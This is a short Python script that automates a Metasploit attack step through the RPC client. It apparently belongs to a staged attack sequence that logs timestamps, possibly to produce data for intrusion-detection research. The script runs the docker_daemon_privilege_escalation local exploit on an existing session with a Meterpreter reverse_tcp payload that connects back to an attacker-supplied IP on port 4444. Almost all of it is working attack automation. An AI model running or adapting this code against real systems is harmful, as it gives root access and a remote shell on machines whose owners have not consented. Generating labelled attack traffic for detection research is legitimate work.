import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]

    client = MsfRpcClient('kali')
    
    # start step 4
    output_time_file_start = 'time_step_4_start.txt'
    record_timestamp(folder, output_time_file_start)
    time.sleep(60)

    try:
        exploit = client.modules.use('exploit', 'linux/local/docker_daemon_privilege_escalation')
        payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
        exploit['SESSION'] = 1
        payload['LHOST'] = my_ip
        payload['LPORT'] = 4444

        exploit.execute(payload=payload)
        
    except Exception as e:
        print(e)
        pass

    time.sleep(60)
    output_time_file_end = 'time_step_4_end.txt'
    record_timestamp(folder, output_time_file_end)
    time.sleep(60)


main(sys.argv)
